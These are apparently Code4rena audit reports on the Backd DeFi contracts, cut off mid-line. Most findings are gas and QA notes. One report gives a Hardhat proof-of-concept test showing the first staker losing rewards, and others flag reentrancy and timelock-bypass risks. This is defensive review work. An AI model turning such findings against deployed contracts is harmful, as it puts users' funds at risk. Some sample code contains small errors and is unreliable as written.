https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532 ```solidity     //TOOD: See if this is still needed somewhere ```
Issue: `Require` message is too long Explanation: The `require` revert strings referenced below can be shortened to 32 characters or fewer (as shown) to save gas   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L296 ```solidity         require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); ``` Change the referenced error message from `a staker vault already exists for the token` to `token already has staker vault`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L59 ```solidity         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); ``` Change the referenced error message from `contract can only be initialized once` to `contract already initialized`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L60 ```solidity         require(_minter != address(0), Error.INVALID_MINTER); ``` Change the referenced error message from `the minter address of the LP token and the pool address do not match` to `minter and pool address mismatch`   The same error message occurs in the lines referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L72  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L73  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L74  Example: ```solidity         require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE); ``` Change the referenced error message from `invalid parameter value attempted` to `invalid parameter value attempt`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L153 ```solidity         require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             "Maximum non-inflation amount exceeded."         ); ``` Change error message to `Max non-inflation amt exceeded`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L110 ```solidity         require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); ``` Change the referenced error message from `deadline has not been reached yet` to `deadline not yet reached`   Issue: Should use `!= 0` instead of `> 0` in a `require` statement if variable is an unsigned integer (`uint`)   Explanation: `!= 0` should be used where possible since `> 0` costs more gas  The same `require` occurs in all three lines below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125  ```solidity         require(amount > 0, Error.INVALID_AMOUNT); ``` Change `amount > 0` to `amount != 0` in each case   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92 ```solidity         require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ``` Change `totalLockedBoosted > 0` to `totalLockedBoosted != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 ```solidity         require(length > 0, "No entries"); ``` Change `length > 0` to `length != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 ```solidity         require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` Change `totalClaimable > 0` to `totalClaimable != 0`   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84 ```solidity         require(unallocatedSupply > 0, "No reward tokens in contract"); ``` Change `unallocatedSupply > 0` to `unallocatedSupply != 0`   Issue: Variables should not be initialized to their default values  Explanation: For example, initialization of `booleans` to their default value of `false` is unnecessary and costs gas  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L412 ```solidity         bool keeperGaugeExists = false; ``` Change to `bool keeperGaugeExists;`   Issue: Array length should not be looked up in every iteration of a `for` loop  Explanation: Calculating the array length costs gas  Recommendation: Read the length of the array from memory before executing the loop   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 ```solidity         for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ``` Recommendation: ```solidity         uint256 totalRolesLength = roles.length;          for (uint256 i; i < totalRolesLength; i = i.uncheckedInc()) { ``` Similarly for the seven `for` loops referenced below:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L116  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L94  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  
 ### 1. array length in loops can be cached instead of calculating in every iteration  The loop bounds are calculated with `array.length` which are calculated in every loop iterations which can result in high gas. The array length can be cached instead of calculating in every loop iteration to save gas.  ```solidity // Before for (uint i = 0; i < amounts.length; i++) { }  // After uint len = amounts.length; for (uint i = 0; i < len; i++) { } ```  The instances where this pattern can be applied is found as follows  ```solidity > grep -rn './contracts/tokenomics' -e 'for.*[.]length' ./contracts/tokenomics/FeeBurner.sol:59:        for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ./contracts/tokenomics/VestedEscrow.sol:94:        for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ./contracts/tokenomics/InflationManager.sol:119:        for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ### 2. Use solidity custom errors to save gas  solidity 0.8.4 introduces custom errors which are cheaper than using revert strings in terms of gas Use the custom error patterns to reduce gas cost.  for eg.  ```solidity    // Before   require(condition, "Revert strings");    // After   error CustomError();   if (!condition) {     revert CustomError();   } ```  more details can be found [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)  ### 3. `!=0` is cheaper than `>0`  - In require statement, using `!=0` is cheaper than using `>0` for uints  ```solidity > grep -rn "./contracts/tokenomics" -e "require(.* > 0" ./contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); ./contracts/tokenomics/KeeperGauge.sol:142:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ./contracts/tokenomics/AmmGauge.sol:111:        require(amount > 0, Error.INVALID_AMOUNT); ./contracts/tokenomics/AmmGauge.sol:136:        require(amount > 0, Error.INVALID_AMOUNT); ```
### 1. Emitted event reports wrong value  In the function `stakeFor()` the event should report `staked` instead of `amount`  ```solidity     function stakeFor(address account, uint256 amount) public virtual override returns (bool) {         ........         uint256 staked = newBal - oldBal;         balances[account] += staked;         totalStaked += staked;         emit AmmStaked(account, ammToken, amount);         // recommendation         // emit AmmStaked(account, ammToken, staked);     } ```  - [AmmGauge.sol#L66](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L66) - Same for function `unstakeFor()` [AmmGauge.sol#L136](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L136)  ### 2. Use Two-Step Transfer Pattern for Access Controls  - It is  possible that the role accidentally transfers ownership to the wrong address, resulting in a loss of the role.  - For example : [setMinter()](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63)  Recommendation:  ```solidity address minter; address temporaryMinter;  function setMinter(address owner_) external onlyGovernance {   temporaryMinter = owner_; }  function claimOwnership() external {   require(msg.sender == temporaryMinter);   minter = temporaryMinter;   temporaryOwner = address(0); } ```
# QA Report  ## [L-01] Missing zero address check  If parameter is accidentally set to zero the contract will have to be redeployed  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L96 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/Authorization.sol#L10 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L33 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L50 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L26 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L40 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L72  ## [L-02] Ownership transfer should be done in two steps https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  Consider implementing a two step process where `minter` nominates an account and the nominated account needs to call an `acceptMinter` function for the transfer of ownership to fully succeed.  This ensures the nominated EOA account is a valid and active account.  Other instance:  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L78  ## [N-01] Typo https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ```solidity Recieve ``` Change to "Receive"  ## [N-02] Remove TODO  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ```solidity //TOOD: See if this is still needed somewhere ``` Also please fix wrong (but comical) spelling in future `TODO` notes.
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L140   # Vulnerability details  ## Impact The first staker within the `AmmGauge` may not get the rewards if the pool is not checkpointed right after he stakes and before he wants to claim the rewards.  ## Proof of Concept A testing environment that reproduces how the protocol is going to be deployed and managed is used to evaluate this case under the following assumptions and simplifications.   1) The inflation rate is fixed for simplicity (`0.001`).  2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment. 3) The minting of tokens impact both on the inflation calculation and their balance. But this test evaluates the states just before minting (claimable balances). Following how the pools are updated, they are checkpointed in the end of the `_executeInflationRateUpdate` call. Not while staking.  In order to illustrate this scenario we will show both the vulnerable and non vulnerable situations.  Vulnerable Situation: 1) Alice, Bob, Charlie and David are future users of the pool. They all notice the inception of this project and decide to stake. 2) They all stake the same amount. Their transactions are mined with 1min of difference starting from Alice and finishing with David. 3) There is no external pool checkpoint between Alice and Bob (besides the one that is triggered when Bob stakes). 4) Sometime happens and they all want to check their accumulated reward balance. Alice accumulated much less than the others.  Non Vulnerable Situation: - The same as before but calling externally `_poolCheckpoint()` between Alice stake call and Bobs' and before checking the accumulated rewards.  The code to show this has a `secureCheckpoints` toggle that can be set as true or false to trigger (or not) the intermediate poolCheckpoints.          it('First Staker Rewards Calculation', async function () {                           let secureCheckpoints = false;             let currentShare, currentStakedIntegral, balances;             await this.ammgauge.poolCheckpoint();             await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 10 days                          const updateStates = async (from) => {                  currentShare = await this.ammgauge.perUserShare(from.address);                 currentStakedIntegral = await this.ammgauge.perUserStakedIntegral(from.address);                 balances = await this.ammgauge.balances(from.address);             }              const stake = async (to, amount) => {                 await updateStates(to)                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).stake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));                 await updateStates(to);                 console.log(" ")             }              const unstake = async (to, amount) => {                 await updateStates(to)                 console.log(" ")                 // Balance before                 let balanceBefore = await this.ammgauge.balances(to.address);                 // Stake                 await this.ammgauge.connect(to).unstake(amount);                 expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));                 await updateStates(to);                 console.log(" ")             }              // Each user stakes tokens             let initialStaking = ethers.utils.parseEther("10")             console.log(" ")             console.log("USERS STAKE");             for (const user of users) {             await stake(user, initialStaking)             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};             await ethers.provider.send("evm_increaseTime", [60 * 60]); // 1hr between stakes             }             console.log(" ")              await ethers.provider.send("evm_increaseTime", [ 5 * 24 * 60 * 60]); // 5 days             if(secureCheckpoints){await this.ammgauge.poolCheckpoint()};              let claimableRewards = [];             let claimedRewards = [];             console.log(" ")             console.log("USERS CLAIMABLE REWARDS AFTER 5 days");             console.log(" ")             for (const user of users) {                 let stepClaimable = await this.ammgauge.claimableRewards(user.address);                 claimableRewards.push(ethers.utils.formatEther(stepClaimable))                  let rewardsClaim = await (await this.ammgauge.claimRewards(user.address)).wait()                 claimedRewards.push(ethers.utils.formatEther(rewardsClaim.logs[0]["data"]))             }              console.log("Claimable calculated")             console.log("   ALICE - BOB -  CHARLIE - DAVID")             console.log(claimableRewards)              console.log(" ")             console.log("Effectively Claimed")             console.log("   ALICE - BOB -  CHARLIE - DAVID")             console.log(claimableRewards)         })  The outputs for both cases are shown on the following chart. The initial staking amount is 10eth amount of the DummyERC20 token.  |         | Without Checkpoints | With Checkpoints | |:-------:|:-------------------:|:----------------:| |  Alice  |         6.6         |       115.5      | |   Bob   |        111.9        |       111.9      | | Charlie |        110.1        |       110.1      | |  David  |        108.9        |       108.9      |   ## Recommended Mitigation Steps - Check how is calculated the staking variables while the pool has no tokens staked and also how the updates and checkpoints are performed.  
## Summary  ### Low Risk Issues | |Issue|Instances| |-|:-|:-:| | 1 | `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times | 1 | | 2 | Non-exploitable reentrancy | 1 | | 3 | Users can DOS themselves by executing `prepareUnlock(0)` many times | 1 | | 4 | Unused/empty `receive()`/`fallback()` function | 3 | | 5 | `safeApprove()` is deprecated | 4 | | 6 | Missing checks for `address(0x0)` when assigning values to `address` state variables | 8 | | 7 | `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` | 1 |  Total: 19 instances over 7 issues  ### Non-critical Issues | |Issue|Instances| |-|:-|:-:| | 1 | Unneded import | 1 | | 2 | Return values of `approve()` not checked | 1 | | 3 | Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability | 2 | | 4 | Missing event for critical parameter change | 3 | | 5 | Use a more recent version of solidity | 1 | | 6 | Use a more recent version of solidity | 16 | | 7 | Constant redefined elsewhere | 10 | | 8 | Inconsistent spacing in comments | 3 | | 9 | File is missing NatSpec | 5 | | 10 | NatSpec is incomplete | 17 | | 11 | Event is missing `indexed` fields | 10 | | 12 | Not using the named return variables anywhere in the function is confusing | 2 | | 9 | Typos | 6 |  Total: 80 instances over 13 issues   ## Low Risk Issues  ### 1. `migrate()` still does transfers when the transfer is to the same pool, and this can be done multiple times There's no check that the old address isn't the same as the new address, and there's no check that the migration has already happened  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  52       function migrate(address oldPoolAddress_) public override { 53           ILiquidityPool oldPool_ = ILiquidityPool(oldPoolAddress_); 54           IERC20 lpToken_ = IERC20(oldPool_.getLpToken()); 55           uint256 lpTokenAmount_ = lpToken_.balanceOf(msg.sender); 56           require(lpTokenAmount_ != 0, "No LP Tokens"); 57           require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); 58:          lpToken_.safeTransferFrom(msg.sender, address(this), lpTokenAmount_); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L58  ### 2. Non-exploitable reentrancy There is no reentrancy guard in this function, and if used with a token that has transfer callbacks, such as an ERC777, the caller can reenter before `balances` is updated. I don't currently see a way to exploit this  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol   #1  130          uint256 oldBal = IERC20(ammToken).balanceOf(address(this)); 131          IERC20(ammToken).safeTransfer(dst, amount); 132          uint256 newBal = IERC20(ammToken).balanceOf(address(this)); 133          uint256 unstaked = oldBal - newBal; 134          balances[msg.sender] -= unstaked; 135:         totalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L130-L135  ### 3. Users can DOS themselves by executing `prepareUnlock(0)` many times There's no check on the amount, and every call add another entry to an array. When the user finally calls `executeUnlocks()` they'll run out of gas  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol   #1  118      function prepareUnlock(uint256 amount) external override { 119          require( 120              totalStashed[msg.sender] + amount <= balances[msg.sender], 121              "Amount exceeds locked balance" 122:         ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L118-L122  ### 4. Unused/empty `receive()`/`fallback()` function If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`)  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  31:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L31  ```solidity File: protocol/contracts/RewardHandler.sol   #2  30:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L30  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #3  35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ### 5. `safeApprove()` is deprecated [Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead  *There are 4 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  27:               IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L27  ```solidity File: protocol/contracts/RewardHandler.sol   #2  52:           IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L52  ```solidity File: protocol/contracts/RewardHandler.sol   #3  64:           IERC20(token).safeApprove(spender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L64  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #4  118:          IERC20(token_).safeApprove(spender_, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ### 6. Missing checks for `address(0x0)` when assigning values to `address` state variables  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  72:           token = _token; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L72  ```solidity File: protocol/contracts/BkdLocker.sol  49:           rewardToken = _rewardToken;  74:           rewardToken = newRewardToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L49  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  43:           treasury = treasury_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  39:           ammToken = _ammToken; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L39  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  65:           fundAdmin = fundAdmin_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L65  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  48:           pool = _pool; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L48  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  21:           minter = _minter; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L21  ### 7. `_prepareDeadline()`, `_setConfig()`, and `_executeDeadline()` should be `private` I flagged this in the last Backd contest, but it doesn't seem to have been addressed, so bringing it up again: These functions have the ability to bypass the timelocks of every setting. No contract besides the `Preparable` contract itself should need to call these functions, and having them available will lead to exploits. The contracts that currently call `_setConfig()` in their constructors should be given a new function `_initConfig()` for this purpose. The `Vault` [calls](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L222) some of these functions as well, and should be changed to manually inspect the deadline rather than mucking with the internals, which is error-prone. The mappings should also be made `private`, and there should be public getters to read their values  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/utils/Preparable.sol   #1  115      /** 116       * @notice Execute uint256 config update (with time delay enforced). 117       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 118       * @return New value. 119       */ 120      function _executeUInt256(bytes32 key) internal returns (uint256) { 121          _executeDeadline(key); 122          uint256 newValue = pendingUInts256[key]; 123          _setConfig(key, newValue); 124          return newValue; 125      } 126   127      /** 128       * @notice Execute address config update (with time delay enforced). 129       * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 130       * @return New value. 131       */ 132      function _executeAddress(bytes32 key) internal returns (address) { 133          _executeDeadline(key); 134          address newValue = pendingAddresses[key]; 135          _setConfig(key, newValue); 136          return newValue; 137:     } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L115-L137  ## Non-critical Issues  ### 1. Unneded import  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/BkdToken.sol   #1  8:   import "../../libraries/ScaledMath.sol"; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L8  ### 2. Return values of `approve()` not checked Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  25:           IERC20(rewardToken_).approve(msg.sender, type(uint256).max); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L25  ### 3. Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #1  10:       uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L10  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #2  12:       uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L12  ### 4. Missing event for critical parameter change  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  58        function setMinter(address _minter) external override onlyGovernance returns (bool) { 59            require(minter == address(0), Error.ADDRESS_ALREADY_SET); 60            require(_minter != address(0), Error.INVALID_MINTER); 61            minter = _minter; 62            return true; 63:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L58-L63  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #2  68        function setAdmin(address _admin) external override { 69            require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 70            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 71            admin = _admin; 72:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #3  74        function setFundAdmin(address _fundadmin) external override { 75            require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 76            require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); 77            fundAdmin = _fundadmin; 78:       } ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78  ### 5. Use a more recent version of solidity Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #1  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L2  ### 6. Use a more recent version of solidity Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions  *There are 16 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L2  ```solidity File: protocol/contracts/Controller.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L2  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L2  ```solidity File: protocol/contracts/BkdLocker.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L2  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L2  ```solidity File: protocol/contracts/AddressProvider.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L2  ```solidity File: protocol/contracts/RewardHandler.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L2  ```solidity File: protocol/contracts/tokenomics/Minter.sol  2:    pragma solidity 